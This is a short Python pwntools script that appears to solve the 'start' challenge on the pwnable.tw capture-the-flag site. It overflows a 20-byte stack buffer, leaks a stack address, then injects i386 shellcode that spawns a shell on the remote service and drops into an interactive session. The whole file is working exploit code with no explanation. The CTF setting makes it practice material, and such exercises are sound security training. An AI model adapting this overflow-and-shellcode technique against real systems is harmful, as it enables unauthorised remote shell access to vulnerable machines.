from pwn import *
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'

payload = asm(shellcraft.i386.linux.sh())

buffer = 20

#r = process("start")
r = remote("chall.pwnable.tw", port=10000)
print(r.read())
r.send(b"A" * buffer + 0x08048087.to_bytes(4, "little"))
address = int.from_bytes(r.read()[:4], "little")
print(hex(address))
r.send(b"A" * buffer + (address + 20).to_bytes(4, "little") + payload)
r.interactive()
